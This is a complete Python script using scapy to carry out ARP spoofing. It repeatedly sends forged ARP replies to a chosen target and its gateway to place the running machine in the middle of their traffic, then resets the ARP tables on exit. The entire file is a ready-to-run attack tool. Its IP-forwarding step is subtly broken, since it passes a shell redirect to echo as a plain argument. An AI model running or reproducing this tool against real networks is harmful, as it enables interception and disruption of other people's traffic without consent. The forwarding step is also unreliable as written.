#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse
import subprocess


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="The target IP address you wish to scan poison.")
    parser.add_option("-g", "--gateway", dest="gateway", help="The gateway/router IP address.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target ip address, use --help for more info")
    elif not options.gateway:
        parser.error("[-] Please specify the router ip address, use --help for more info")
    return options


def get_mac(ip):  # function to scan for devices
    arp_request = scapy.ARP(pdst=ip)  # building ARP request packet with user defined ip range
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # building Ether packet to define the broadcast MAC
    arp_request_broadcast = broadcast / arp_request  # combining the ARP and Ether packets so they can be sent
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # sending packet to the broadcast MAC and capturing the resposes in two list(array) variables

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


def setup_iptables():
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])


options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    sent_packets_count = 0
    setup_iptables()
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Sent " + str(sent_packets_count) + " packets", end=''),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ...... Quitting and Resetting ARP tables...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Done.")
